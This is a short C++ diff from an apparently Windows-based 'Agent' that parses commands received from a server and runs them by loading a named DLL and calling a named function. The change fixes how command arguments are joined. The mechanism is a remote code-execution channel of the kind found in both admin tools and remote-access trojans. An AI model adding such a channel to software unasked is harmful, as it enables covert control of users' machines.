@@ -182,10 +182,10 @@ void Agent::GetRequestFromServer()
 					{
 						string library = *it;
 						string func = *(++it);
-						string cmd = *(++it);
-						while (it != res.end())
+						string cmd = "";
+						while (++it != res.end())
 						{
-							cmd.append(*(++it));
+							cmd.append(*it + " ");
 						}
 						responce = runDynamicFunction(library, func, cmd);
 					}
@@ -312,7 +312,11 @@ string Agent::runDynamicFunction(string library, string function, string cmd)
 	HINSTANCE hinstDLL = LoadLibrary(library.c_str());
 	LPGETNUMBER func = (LPGETNUMBER)GetProcAddress(hinstDLL, function.c_str());
 	if (func != NULL)
-		return func(cmd);
+	{
+		string res = func(cmd);
+		return res;
+	}
+
 	FreeLibrary(hinstDLL);
 
 	return string();
